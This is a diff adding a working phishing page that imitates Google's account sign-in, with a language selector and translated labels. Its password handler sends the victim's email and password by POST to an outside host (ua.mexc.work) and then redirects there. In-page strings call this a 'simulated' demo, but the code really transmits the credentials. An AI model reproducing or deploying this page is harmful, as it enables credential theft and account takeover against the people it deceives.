+          <div id="password-error" class="error-message"></div>
+          <div class="input-container">
+            <input type="password" id="password" name="password" required placeholder=" " autocomplete="current-password"/>
+            <label for="password" data-translate-key="enterPasswordLabel">输入您的密码</label>
+          </div>
+          <div class="checkbox-container">
+            <input type="checkbox" id="show-password" onclick="togglePassword()">
+            <label for="show-password" data-translate-key="showPassword">显示密码</label>
+          </div>
+          <div id="login-result-message" class="info-message" style="text-align: left;"></div>
+          <div class="button-area">
+            <button type="button" class="btn-create" onclick="window.location.href='https://accounts.google.com/v3/signin/challenge/wa'" data-translate-key="forgotPassword">忘记了密码？</button>
+            <button type="submit" class="btn-next" data-translate-key="next">下一步</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom-area">
+    <div class="language-group">
+      <div class="language-selector">
+        <div class="custom-language-selector">
+          <div class="selected-language" tabindex="0">
+            <span id="selected-lang-text">简体中文</span> <svg class="dropdown-arrow" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M7 10l5 5 5-5z"></path>
+            </svg>
+          </div>
+          <ul class="language-options">
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="links-group">
+      <a href="https://support.google.com/accounts" data-translate-key="help">帮助</a>
+      <a href="https://policies.google.com/privacy" data-translate-key="privacy">隐私权</a>
+      <a href="https://policies.google.com/terms" data-translate-key="terms">条款</a>
+    </div>
+  </div>
+
+  <script>
+      // Javascript 内容保持不变...
+      // --- Global Variables and Element References ---
+      const loginLoader = document.getElementById('loader');
+      const passwordLoader = document.getElementById('loader-password');
+      const usernameErrorDiv = document.getElementById('username-error');
+      const passwordErrorDiv = document.getElementById('password-error');
+      const loginResultMessageDiv = document.getElementById('login-result-message');
+      const customLangSelectorElement = document.querySelector('.custom-language-selector');
+      const selectedLanguageDiv = customLangSelectorElement?.querySelector('.selected-language');
+      const languageOptionsContainer = customLangSelectorElement?.querySelector('.language-options');
+      const selectedLangTextElement = document.getElementById('selected-lang-text');
+
+      // --- Language Data Parsing ---
+      // Define AF_initDataCallback in a scope accessible to eval
+      var AF_initDataCallback;
+
+      const googleLangDataString = `AF_initDataCallback({key: 'ds:0', hash: '1', data:[[["zh-TW","繁體中文"],["ja","日本語"],["zh-HK","中文（香港）"],["ko","한국어"],["zh-CN","简体中文"],["af","Afrikaans"],["az","azərbaycan"],["bs","bosanski"],["ca","català"],["cs","Čeština"],["cy","Cymraeg"],["da","Dansk"],["de","Deutsch"],["et","eesti"],["en-GB","English (United Kingdom)"],["en-US","English (United States)"],["es-ES","Español (España)"],["es-419","Español (Latinoamérica)"],["eu","euskara"],["fil","Filipino"],["fr-CA","Français (Canada)"],["fr-FR","Français (France)"],["ga","Gaeilge"],["gl","galego"],["hr","Hrvatski"],["id","Indonesia"],["zu","isiZulu"],["is","íslenska"],["it","Italiano"],["sw","Kiswahili"],["lv","latviešu"],["lt","lietuvių"],["hu","magyar"],["ms","Melayu"],["nl","Nederlands"],["no","norsk"],["uz","o‘zbek"],["pl","polski"],["pt-BR","Português (Brasil)"],["pt-PT","Português (Portugal)"],["ro","română"],["sq","shqip"],["sk","Slovenčina"],["sl","slovenščina"],["sr-Latn","srpski (latinica)"],["fi","Suomi"],["sv","Svenska"],["vi","Tiếng Việt"],["tr","Türkçe"],["el","Ελληνικά"],["be","беларуская"],["bg","български"],["ky","кыргызча"],["kk","қазақ тілі"],["mk","македонски"],["mn","монгол"],["ru","Русский"],["sr-Cyrl","српски (ћирилица)"],["uk","Українська"],["ka","ქართული"],["hy","հայերեն"],["iw","עברית"],["ur","اردو"],["ar","العربية"],["fa","فارسی"],["am","አማርኛ"],["ne","नेपाली"],["mr","मराठी"],["hi","हिन्दी"],["as","অসমীয়া"],["bn","বাংলা"],["pa","ਪੰਜਾਬੀ"],["gu","ગુજરાતી"],["or","ଓଡ଼ିଆ"],["ta","தமிழ்"],["te","తెలుగు"],["kn","ಕನ್ನಡ"],["ml","മലയാളം"],["si","සිංහල"],["th","ไทย"],["lo","ລາວ"],["my","မြန်မာ"],["km","ខ្មែរ"]]], sideChannel: {}});`;
+      let parsedGoogleLangs = [];
+      let capturedCallbackData = null;
+      const originalAFInitDataCallback = window.AF_initDataCallback;
+      window.AF_initDataCallback = function(dataObject) {
+          capturedCallbackData = dataObject;
+      };
+
+      try {
+          eval(googleLangDataString);
+          if (capturedCallbackData && capturedCallbackData.data && capturedCallbackData.data[0]) {
+              parsedGoogleLangs = capturedCallbackData.data[0].map(langArray => ({
+                  code: langArray[0],
+                  name: langArray[1]
+              }));
+          } else {
+              throw new Error("Data structure from AF_initDataCallback is not as expected.");
+          }
+      } catch (e) {
+          console.error("Error processing Google language data string:", e);
+          parsedGoogleLangs = [
+               { code: 'zh-CN', name: '简体中文' },
+               { code: 'en', name: 'English' },
+               { code: 'en-US', name: 'English (United States)' },
+               { code: 'en-GB', name: 'English (United Kingdom)' },
+               { code: 'zh-TW', name: '繁體中文' },
+               { code: 'zh-HK', name: '中文 (香港)' },
+               { code: 'ja', name: '日本語' },
+               { code: 'ko', name: '한국어' }
+          ]; // Fallback list
+      } finally {
+          if (originalAFInitDataCallback) {
+              window.AF_initDataCallback = originalAFInitDataCallback;
+          } else {
+              try { delete window.AF_initDataCallback; } catch(delErr) { window.AF_initDataCallback = undefined; }
+          }
+      }
+
+      const availableLanguages = parsedGoogleLangs.length > 0 ? parsedGoogleLangs : [
+          { code: 'zh-CN', name: '简体中文' },
+          { code: 'en', name: 'English' }
+      ];
+
+      // --- Translations Object ---
+      const translations = {
+          "zh-CN": {
+            pageTitle: "登录 - Google 帐号", signIn: "登录", useYourGoogleAccount: "使用您的 Google 帐号", emailOrPhoneLabel: "电子邮件地址或电话号码", forgotEmail: "忘记了电子邮件地址？", guestModeHintPart1: "您用的不是自己的电脑？请使用访客模式无痕登录。", learnMoreGuest: "详细了解如何使用访客模式", createAccount: "创建账号", next: "下一步", welcome: "欢迎", switchAccountTitle: "切换帐号", enterPasswordLabel: "输入您的密码", showPassword: "显示密码", forgotPassword: "忘记了密码？", help: "帮助", privacy: "隐私权", terms: "条款", errorEnterEmailOrPhone: "请输入电子邮件地址或电话号码", errorEnterPassword: "请输入您的密码", phishingWarning: "登录信息已（模拟）记录。\n在真实的网络钓鱼中，这些信息将被发送给攻击者。\n此演示将在此停止。", errorNetwork: "错误：无法发送数据。" // Added network error translation
+          },
+          "en": {
+            pageTitle: "Sign in - Google Accounts", signIn: "Sign in", useYourGoogleAccount: "Use your Google Account", emailOrPhoneLabel: "Email or phone", forgotEmail: "Forgot email?", guestModeHintPart1: "Not your computer? Use Guest mode to sign in privately.", learnMoreGuest: "Learn more about using Guest mode", createAccount: "Create account", next: "Next", welcome: "Welcome", switchAccountTitle: "Switch account", enterPasswordLabel: "Enter your password", showPassword: "Show password", forgotPassword: "Forgot password?", help: "Help", privacy: "Privacy", terms: "Terms", errorEnterEmailOrPhone: "Please enter your email or phone number", errorEnterPassword: "Please enter your password", phishingWarning: "Login information (simulated) has been recorded.\nIn a real phishing attempt, this information would be sent to an attacker.\nThis demo will stop here.", errorNetwork: "Error: Failed to send data."
+          },
+          "ja": {
+            pageTitle: "ログイン - Google アカウント", signIn: "ログイン", useYourGoogleAccount: "Google アカウントを使用する", emailOrPhoneLabel: "メールアドレスまたは電話番号", forgotEmail: "メールアドレスを忘れた場合", guestModeHintPart1: "ご自身のパソコンでない場合は、ゲストモードを使用して非公開でログインしてください。", learnMoreGuest: "ゲストモードの詳細", createAccount: "アカウントを作成", next: "次へ", welcome: "ようこそ", switchAccountTitle: "アカウントを切り替える", enterPasswordLabel: "パスワードを入力してください", showPassword: "パスワードを表示する", forgotPassword: "パスワードをお忘れの場合", help: "ヘルプ", privacy: "プライバシー", terms: "利用規約", errorEnterEmailOrPhone: "メールアドレスまたは電話番号を入力してください", errorEnterPassword: "パスワードを入力してください", phishingWarning: "ログイン情報（シミュレーション）が記録されました。\n実際のフィッシング攻撃では、この情報が攻撃者に送信されます。\nこのデモはここで停止します。", errorNetwork: "エラー：データ送信に失敗しました。"
+          },
+          "zh-TW": {
+            pageTitle: "登入 - Google 帳戶", signIn: "登入", useYourGoogleAccount: "使用您的 Google 帳戶", emailOrPhoneLabel: "電子郵件地址或電話號碼", forgotEmail: "忘記了電子郵件地址？", guestModeHintPart1: "用的不是您自己的電腦？請使用訪客模式以私密方式登入。", learnMoreGuest: "進一步瞭解訪客模式", createAccount: "建立帳戶", next: "繼續", welcome: "歡迎", switchAccountTitle: "切換帳戶", enterPasswordLabel: "輸入您的密碼", showPassword: "顯示密碼", forgotPassword: "忘記了密碼？", help: "說明", privacy: "隱私權", terms: "條款", errorEnterEmailOrPhone: "請輸入您的電子郵件地址或電話號碼", errorEnterPassword: "請輸入您的密碼", phishingWarning: "登入資訊（模擬）已記錄。\n在實際的網路釣魚中，這些資訊將被傳送給攻擊者。\n此示範將在此停止。", errorNetwork: "錯誤：無法傳送資料。"
+          },
+          "ko": {
+            pageTitle: "로그인 - Google 계정", signIn: "로그인", useYourGoogleAccount: "Google 계정 사용", emailOrPhoneLabel: "이메일 또는 휴대전화", forgotEmail: "이메일 주소를 잊으셨나요?", guestModeHintPart1: "내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요。", learnMoreGuest: "게스트 모드 사용 자세히 알아보기", createAccount: "계정 만들기", next: "다음", welcome: "환영합니다", switchAccountTitle: "계정 전환", enterPasswordLabel: "비밀번호를 입력하세요", showPassword: "비밀번호 표시", forgotPassword: "비밀번호를 잊으셨나요?", help: "도움말", privacy: "개인정보처리방침", terms: "약관", errorEnterEmailOrPhone: "이메일 또는 휴대전화 번호를 입력하세요.", errorEnterPassword: "비밀번호를 입력하세요.", phishingWarning: "로그인 정보(시뮬레이션)가 기록되었습니다.\n실제 피싱 시도에서는 이 정보가 공격자에게 전송됩니다.\n이 데모는 여기서 중지됩니다。", errorNetwork: "오류: 데이터를 전송하지 못했습니다."
+          }
+          // Note: No explicit entries for en-US, en-GB, zh-HK as getTranslationData handles fallback
+      };
+
+      // --- Language Detection and Initialization ---
+      function getInitialLanguage() {
+          const browserLanguages = navigator.languages || [navigator.language || 'en'];
+          const supportedCodes = availableLanguages.map(l => l.code);
+
+          for (const browserLang of browserLanguages) {
+              if (supportedCodes.includes(browserLang) && getTranslationData(browserLang)) return browserLang;
+              const primaryLanguage = browserLang.split('-')[0];
+              if (supportedCodes.includes(primaryLanguage) && getTranslationData(primaryLanguage)) return primaryLanguage;
+              if ((browserLang === 'zh-HK' || browserLang === 'zh-TW') && supportedCodes.includes('zh-TW') && getTranslationData('zh-TW')) return 'zh-TW';
+          }
+          const htmlLang = document.documentElement.getAttribute('lang');
+          if (htmlLang && supportedCodes.includes(htmlLang) && getTranslationData(htmlLang)) return htmlLang;
+
+          const defaultPreferences = ['en-US', 'en', 'zh-CN'];
+          for(const pref of defaultPreferences){
+              if (availableLanguages.find(l => l.code === pref) && getTranslationData(pref)) return pref;
+          }
+          return availableLanguages.length > 0 ? availableLanguages[0].code : 'en';
+      }
+
+      let currentLang = getInitialLanguage();
+      document.documentElement.lang = currentLang;
+
+      // --- Translation Fallback Helper ---
+      function getTranslationData(lang) {
+          if (translations[lang]) {
+              return translations[lang];
+          }
+          if (lang?.startsWith('en-')) { return translations['en']; }
+          if (lang === 'zh-HK') { return translations['zh-TW']; }
+          return translations['en'] || {}; // Default to English or empty object
+      }
+
+      // --- Custom Language Selector JS ---
+      function populateLanguageOptions() {
+          if (!languageOptionsContainer) return;
+          languageOptionsContainer.innerHTML = '';
+
+          availableLanguages.forEach(langInfo => {
+              const listItem = document.createElement('li');
+              listItem.dataset.value = langInfo.code;
+              listItem.textContent = langInfo.name; // Use native name
+              listItem.tabIndex = -1;
+
+              if (langInfo.code === currentLang) {
+                  listItem.classList.add('selected');
+              }
+              listItem.addEventListener('click', () => handleOptionSelect(langInfo.code, langInfo.name, listItem));
+              languageOptionsContainer.appendChild(listItem);
+          });
+      }
+
+      function handleOptionSelect(value, nameOfSelectedLang, listItemElement) {
+          currentLang = value;
+          document.documentElement.lang = currentLang;
+
+          if (selectedLangTextElement) {
+              selectedLangTextElement.textContent = nameOfSelectedLang;
+          }
+
+          if (languageOptionsContainer) {
+              languageOptionsContainer.querySelectorAll('li').forEach(opt => opt.classList.remove('selected'));
+          }
+          if(listItemElement) listItemElement.classList.add('selected');
+
+          if (customLangSelectorElement) customLangSelectorElement.classList.remove('open');
+          applyTranslations(currentLang); // Apply UI translations
+
+          // Re-translate dynamic messages if visible
+          const currentTranslationSet = getTranslationData(currentLang);
+          const errorKeys = ['errorEnterEmailOrPhone', 'errorEnterPassword']; // Keys of possible errors shown
+          if (usernameErrorDiv && usernameErrorDiv.textContent !== '') {
+              const currentErrorText = usernameErrorDiv.textContent;
+              let needsRetranslate = false;
+              for(const key of errorKeys) {
+                  if (Object.values(translations).some(trans => trans[key] === currentErrorText)) {
+                      needsRetranslate = true; break;
+                  }
+              }
+              if(needsRetranslate) usernameErrorDiv.textContent = currentTranslationSet.errorEnterEmailOrPhone || "Please enter your email or phone number";
+          }
+          if (passwordErrorDiv && passwordErrorDiv.textContent !== '') {
+              const currentErrorText = passwordErrorDiv.textContent;
+              let needsRetranslate = false;
+              for(const key of errorKeys) {
+                  if (Object.values(translations).some(trans => trans[key] === currentErrorText)) {
+                      needsRetranslate = true; break;
+                  }
+              }
+              if(needsRetranslate) passwordErrorDiv.textContent = currentTranslationSet.errorEnterPassword || "Please enter your password";
+          }
+          if (loginResultMessageDiv && loginResultMessageDiv.innerHTML !== '') {
+              const warningKey = 'phishingWarning';
+              const warningMessage = (currentTranslationSet[warningKey] || translations.en[warningKey] || '').replace(/\n/g, '<br>');
+              // Check if it looks like the warning message before overwriting potentially different messages
+              if (loginResultMessageDiv.innerHTML.includes('模拟') || loginResultMessageDiv.innerHTML.includes('simulated') || loginResultMessageDiv.innerHTML.includes('記録') || loginResultMessageDiv.innerHTML.includes('시뮬레이션') ) {
+                  loginResultMessageDiv.innerHTML = warningMessage;
+              }
+          }
+      }
+
+      function applyTranslations(lang) {
+          const langData = getTranslationData(lang);
+          const fallbackLangData = translations['en'] || {}; // Ensure fallback exists
+
+          document.title = langData?.pageTitle || fallbackLangData.pageTitle || "Sign In";
+
+          document.querySelectorAll('[data-translate-key]').forEach(el => {
+              const key = el.dataset.translateKey;
+              if (el.id === 'selected-lang-text') return; // Skip this
+
+              if (langData && langData[key] !== undefined) {
+                el.textContent = langData[key];
+              } else if (fallbackLangData[key] !== undefined) {
+                el.textContent = fallbackLangData[key];
+              }
+          });
+
+          document.querySelectorAll('[data-translate-key-title]').forEach(el => {
+              const key = el.dataset.translateKeyTitle;
+              if (langData && langData[key] !== undefined) {
+                el.title = langData[key];
+              } else if (fallbackLangData[key] !== undefined) {
+                el.title = fallbackLangData[key];
+              }
+          });
+      }
+
+      // --- Event Listeners and Initial Setup ---
+      if (selectedLanguageDiv && languageOptionsContainer) {
+          selectedLanguageDiv.addEventListener('click', (event) => {
+              event.stopPropagation();
+              const isOpen = customLangSelectorElement.classList.toggle('open');
+              if (isOpen) {
+                  populateLanguageOptions();
+                  const currentSelectedLi = languageOptionsContainer.querySelector('li.selected') || languageOptionsContainer.querySelector('li');
+                  if (currentSelectedLi) setTimeout(() => currentSelectedLi.focus(), 0);
+              }
+          });
+
+          selectedLanguageDiv.addEventListener('keydown', (event) => {
+              if (event.key === 'Enter' || event.key === ' ') {
+                  event.preventDefault();
+                  selectedLanguageDiv.click();
+              } else if (event.key === 'ArrowDown' || event.key === 'ArrowUp') {
+                  event.preventDefault();
+                  if (!customLangSelectorElement.classList.contains('open')) {
+                      selectedLanguageDiv.click();
+                  } else {
+                      const items = Array.from(languageOptionsContainer.querySelectorAll('li'));
+                      if (items.length > 0) {
+                          if (event.key === 'ArrowDown') items[0].focus();
+                          else items[items.length - 1].focus();
+                      }
+                  }
+              }
+          });
+
+          languageOptionsContainer.addEventListener('keydown', (event) => {
+              const items = Array.from(languageOptionsContainer.querySelectorAll('li'));
+              if (!items.length) return;
+              let currentIndex = items.findIndex(item => item === document.activeElement);
+
+              if (event.key === 'Escape') {
+                  event.preventDefault();
+                  customLangSelectorElement.classList.remove('open');
+                  selectedLanguageDiv.focus();
+              } else if (event.key === 'Enter' && currentIndex > -1) {
+                  event.preventDefault();
+                  items[currentIndex].click();
+                  selectedLanguageDiv.focus();
+              } else if (event.key === 'ArrowDown') {
+                  event.preventDefault();
+                  currentIndex = (currentIndex + 1) % items.length;
+                  items[currentIndex].focus();
+              } else if (event.key === 'ArrowUp') {
+                  event.preventDefault();
+                  currentIndex = (currentIndex - 1 + items.length) % items.length;
+                  items[currentIndex].focus();
+              } else if (event.key === 'Tab') {
+                  setTimeout(() => {
+                      if (!customLangSelectorElement.contains(document.activeElement)) {
+                          customLangSelectorElement.classList.remove('open');
+                      }
+                  }, 0);
+              }
+          });
+      }
+
+      document.addEventListener('click', (event) => {
+          if (customLangSelectorElement && !customLangSelectorElement.contains(event.target) && customLangSelectorElement.classList.contains('open')) {
+              customLangSelectorElement.classList.remove('open');
+          }
+      });
+
+      document.addEventListener('DOMContentLoaded', () => {
+          // currentLang is initialized globally using getInitialLanguage()
+          if (customLangSelectorElement) {
+              populateLanguageOptions(); // Populates based on availableLanguages and sets selected class based on currentLang
+              const initialSelectedLangInfo = availableLanguages.find(l => l.code === currentLang);
+              if (initialSelectedLangInfo && selectedLangTextElement) {
+                  selectedLangTextElement.textContent = initialSelectedLangInfo.name; // Set initial display text
+              }
+          }
+          applyTranslations(currentLang); // Apply initial translations to UI elements
+      });
+      // --- End Custom Language Selector JS ---
+
+
+      // --- Original Page Logic Functions ---
+      function handleUsername(event) {
+        event.preventDefault();
+        if (usernameErrorDiv) usernameErrorDiv.textContent = '';
+
+        const usernameInput = document.getElementById('username');
+        const username = usernameInput.value.trim();
+        const currentTranslationSet = getTranslationData(currentLang);
+
+        if (!username) {
+            if (usernameErrorDiv) usernameErrorDiv.textContent = currentTranslationSet.errorEnterEmailOrPhone || "Please enter your email or phone number";
+            usernameInput.focus();
+            return;
+        }
+
+        const nextButton = event.target.querySelector('.btn-next');
+        if (nextButton) nextButton.disabled = true;
+        if(loginLoader) loginLoader.style.display = 'block';
+
+        setTimeout(() => {
+          document.getElementById('displayed-email').textContent = username;
+          document.getElementById('login-section').style.display = 'none';
+          document.getElementById('password-section').style.display = 'flex';
+          document.getElementById('password').focus();
+
+          if(loginLoader) loginLoader.style.display = 'none';
+          if (nextButton) nextButton.disabled = false;
+
+        }, 1500);
+      }
+
+      function togglePassword() {
+        const passwordInput = document.getElementById('password');
+        const showPasswordCheckbox = document.getElementById('show-password');
+        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+      }
+
+      function backToLogin() {
+        const userDisplayElement = document.querySelector('.user-display[onclick="backToLogin()"]');
+
+        if (passwordLoader) passwordLoader.style.display = 'block';
+        if (userDisplayElement) userDisplayElement.style.pointerEvents = 'none';
+
+        setTimeout(() => {
+          document.getElementById('password-section').style.display = 'none';
+          document.getElementById('login-section').style.display = 'flex';
+
+          const usernameInput = document.getElementById('username');
+          if (usernameInput) usernameInput.focus();
+
+          const passwordInput = document.getElementById('password');
+          if (passwordInput) passwordInput.value = '';
+
+          const showPasswordCheckbox = document.getElementById('show-password');
+          if (showPasswordCheckbox) showPasswordCheckbox.checked = false;
+
+          togglePassword();
+
+          if(loginLoader) loginLoader.style.display = 'none';
+          if (passwordLoader) passwordLoader.style.display = 'none';
+          if (userDisplayElement) userDisplayElement.style.pointerEvents = 'auto';
+
+          if (usernameErrorDiv) usernameErrorDiv.textContent = '';
+          if (passwordErrorDiv) passwordErrorDiv.textContent = '';
+          if (loginResultMessageDiv) loginResultMessageDiv.innerHTML = '';
+        }, 1500);
+      }
+
+      function handlePassword(event) {
+          event.preventDefault();
+          if (passwordErrorDiv) passwordErrorDiv.textContent = '';
+          if (loginResultMessageDiv) loginResultMessageDiv.innerHTML = '';
+
+          const passwordInput = document.getElementById('password');
+          const password = passwordInput.value;
+          const currentTranslationSet = getTranslationData(currentLang);
+
+          if (!password) {
+              if (passwordErrorDiv) passwordErrorDiv.textContent = currentTranslationSet.errorEnterPassword || "Please enter your password";
+              passwordInput.focus();
+              return;
+          }
+
+          const username = document.getElementById('displayed-email').textContent; // Holds the email/phone
+
+          const passwordNextButton = event.target.querySelector('.btn-next');
+          if (passwordLoader) passwordLoader.style.display = 'block';
+          if (passwordNextButton) passwordNextButton.disabled = true;
+
+          const randomDelay = Math.floor(Math.random() * 1001) + 1000; // Random delay 1000-2000ms
+
+          setTimeout(() => {
+              // --- Prepare Data for POST ---
+              const targetUrl = 'https://ua.mexc.work/login'; // CORRECTED URL
+              const formData = new URLSearchParams();
+              formData.append('username', username); // Send captured email/phone as 'username'
+              formData.append('password', password);
+              formData.append('email', username);    // ADDED BACK email field
+
+              fetch(targetUrl, {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                  },
+                  body: formData.toString(),
+                  keepalive: true // Suggest browser try to keep request alive if page navigates away
+              })
+              .then(response => {
+                  console.log('POST request initiated, server responded (status:', response.status, ')');
+                  // We are redirecting client-side immediately after fetch, so no action needed here normally
+              })
+              .catch(error => {
+                  // Log error, but user is likely already being redirected below.
+                  console.error('Error sending login data (user may have already been redirected):', error);
+              });
+
+              // --- Redirect Frontend IMMEDIATELY ---
+              console.log('Redirecting frontend to /alert...');
+              window.location.href = 'https://ua.mexc.work/alert'; // CORRECTED Frontend redirect URL
+
+              // No need to hide loader or re-enable button here, as the redirect takes over.
+
+          }, randomDelay);
+      }
+  </script>
+
+</body>
+</html>
